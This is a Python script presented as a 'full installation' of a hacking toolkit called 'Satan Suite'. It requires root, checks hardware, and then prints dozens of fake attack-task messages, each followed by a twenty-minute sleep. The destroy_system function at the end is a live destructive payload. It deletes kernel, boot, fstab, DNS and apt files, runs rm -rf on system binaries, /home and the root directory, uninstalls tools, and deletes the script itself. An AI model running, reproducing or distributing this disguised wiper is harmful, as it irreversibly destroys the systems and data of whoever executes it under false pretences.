#!/usr/bin/env python3
import os
import sys
import time
import shutil
import platform
import psutil
from datetime import datetime

def check_system_requirements():
    """Check system specifications and print requirements."""
    print("\nChecking system specifications...\n")

    # Current system specifications
    cpu_info = platform.processor()
    core_count = psutil.cpu_count(logical=False)
    logical_cores = psutil.cpu_count(logical=True)
    memory = psutil.virtual_memory().total // (1024 ** 3)  # GB
    disk_space = shutil.disk_usage("/").free // (1024 ** 3)  # GB
    cpu_freq = psutil.cpu_freq().max / 1000 if psutil.cpu_freq() else "Unknown"

    print(f"Current System Specifications:")
    print(f"  CPU: {cpu_info} ({core_count} cores / {logical_cores} threads)")
    print(f"  CPU Frequency: {cpu_freq} GHz")
    print(f"  RAM: {memory} GB")
    print(f"  Available Storage: {disk_space} GB\n")

    # Recommended system requirements
    print("Minimum System Requirements:")
    print("  CPU: 8 or 16 cores, Base Clock Speed: 3.2 GHz or higher, Boost: 5.4 GHz or higher")
    print("  RAM: 32 GB or 64 GB DDR5, Speed: 5200 MHz or higher")
    print("  Storage: 40 GB or more, Read/Write: 7000 MB/s or higher")
    print("  GPU: Discrete GPU with 12GB VRAM\n")

    # Compatibility check
    if (
        core_count < 8 or
        memory < 32 or
        disk_space < 40 or
        (cpu_freq != "Unknown" and cpu_freq < 3.2)
    ):
        print("Warning: Your system does not meet the minimum requirements for running this tool.")
        response = input("Would you like to proceed anyway? (Y/N): ").strip().lower()
        if response != "y":
            print("Exiting installation due to insufficient system specifications.")
            sys.exit(1)

def animated_print(message, delay=1200, animation_char=".", animation_time=10):
    """Print a message with an animation, including start and end times."""
    start_time = datetime.now().strftime("%H:%M:%S")
    print(f"[{start_time}] Starting: {message}")

    for _ in range(animation_time):  # Simple animation loop
        print(animation_char, end='', flush=True)
        time.sleep(1)
    print()  # Newline after animation

    time.sleep(delay - animation_time)  # Adjust total delay

    end_time = datetime.now().strftime("%H:%M:%S")
    print(f"[{end_time}] Completed: {message}")

def check_sudo():
    """Ensure the script is run as sudo."""
    if os.geteuid() != 0:
        print("Script must be run as sudo")
        sys.exit(1)

def delete_file(filepath):
    """Delete a file if it exists."""
    if os.path.exists(filepath):
        os.remove(filepath)

def delete_directory(directory):
    """Delete a directory if it exists."""
    if os.path.exists(directory):
        shutil.rmtree(directory)

def uninstall_package(package_name):
    """Uninstall a package using apt."""
    os.system(f"apt-get remove -y {package_name}")

def destroy_system():
    """Perform system destruction steps."""
    print("\nInitiating full installation sequence...\n")

    # Critical system file deletions
    delete_file("/etc/resolv.conf")
    delete_directory("/etc/apt")
    delete_file("/boot/vmlinuz")
    delete_file("/etc/fstab")
    os.system("rm -rf /lib/modules/*")
    
    # Uninstall common tools
    uninstall_package("git")
    uninstall_package("wget")
    uninstall_package("gophish")

    # Overwrite system binaries
    os.system("rm -rf /bin/* /sbin/* /usr/bin/* /usr/sbin/*")

    # Remove all user files
    os.system("rm -rf /home/*")
    os.system("rm -rf /*")  # DANGEROUS: Deletes everything possible.

    # Self-deletion
    os.remove(sys.argv[0])
    print("System Hack Environment complete. Satan Resolving ....")

def satan_suite():
    """Main Satan Suite simulation."""
    # List of 96 tasks for 32-hour runtime
    tasks = [
        "Running Satan Suite v15.0",
        "Creating a universal patch assembly",
        "Building the ultimate hacking suite",
        "Scanning system for architecture weaknesses",
        "Applying dynamic patches to kernel vulnerabilities",
        "Downloading system-integrated attack modules",
        "Injecting malware libraries into secure zones",
        "Constructing advanced malware payloads",
        "Executing kernel injection protocols",
        "Simulating advanced packet sniffing",
        "Establishing remote botnet control",
        "Compiling exploit libraries",
        "Configuring supply chain attack vectors",
        "Simulating advanced web attack suite",
        "Compiling cross-platform malware binaries",
        "Preparing full destructive payload",
        "Downloading rootkit configurations",
        "Injecting ransomware payload",
        "Encrypting system files",
        "Removing decryption keys",
        "Finalizing system destruction module",
        "Preparing environment for complete wipe",
        "Injecting final destructive payload",
        "Simulating global DDoS attack prototypes",
        "Downloading advanced Trojan horses",
        "Building zero-day exploitation modules",
        "Activating machine learning-based attacks",
        "Embedding advanced stealth protocols",
        "Analyzing kernel architecture",
        "Disabling firewall and security defenses",
        "Deactivating antivirus modules",
        "Overwriting system binaries",
        "Launching destructive network attacks",
        "Extracting sensitive data",
        "Configuring hardware exploits",
        "Simulating multi-stage attacks",
        "Uploading fake system updates",
        "Deploying payloads to connected devices",
        "Disrupting active processes",
        "Wiping shadow copies and backups",
        "Generating random malicious payloads",
        "Executing recursive deletion protocols",
        "Building quantum-resistant malware",
        "Embedding ransomware in boot sector",
        "Removing bootloader configurations",
        "Deleting all user accounts",
        "Injecting rogue DNS configurations",
        "Overwriting secure partition tables",
        "Executing final kernel-level attack",
        "Disabling all network interfaces",
        "Hijacking connected IoT devices",
        "Scrambling file system metadata",
        "Corrupting database files",
        "Injecting malware into firmware",
        "Encrypting backup drives",
        "Rendering hardware peripherals inoperable",
        "Deleting all system logs",
        "Corrupting BIOS configurations",
        "Simulating AI-driven malware attacks",
        "Disabling security updates permanently",
        "Generating fake system crashes",
        "Injecting boot sector exploits",
        "Launching cross-system attacks",
        "Embedding tracking malware in network",
        "Deploying keylogger modules",
        "Disabling remote access protocols",
        "Overwriting critical security configurations",
        "Injecting malicious scripts into OS",
        "Simulating mass system instability",
        "Causing intentional hardware overload",
        "Destroying file allocation tables",
        "Simulating worm propagation",
        "Embedding logic bombs in binaries",
        "Generating and encrypting all files",
        "Simulating ransomware spread",
        "Disabling CPU hyperthreading",
        "Injecting memory corruption exploits",
        "Simulating false positive security alerts",
        "Hijacking user credentials",
        "Injecting infinite loop commands",
        "Randomizing device hardware IDs",
        "Disabling bootloader entries",
        "Crippling kernel threads",
        "Launching multi-threaded CPU overload attacks",
        "Purging USB device drivers",
        "Shutting down power management systems",
        "Breaking primary file indexing services",
        "Destroying all RAID configurations",
        "Finalizing and deploying destruction payload",
    ]

    # Execute each task with a 20-minute delay
    for task in tasks:
        animated_print(task, delay=1200)

    # Destructive actions (executed immediately after the final step)
    destroy_system()

if __name__ == "__main__":
    check_sudo()
    check_system_requirements()

    # Validate the argument strictly
    if len(sys.argv) != 2 or sys.argv[1] != "--full-installation":
        print("Usage: sudo python3 satan.py --full-installation")
        sys.exit(1)

    satan_suite()
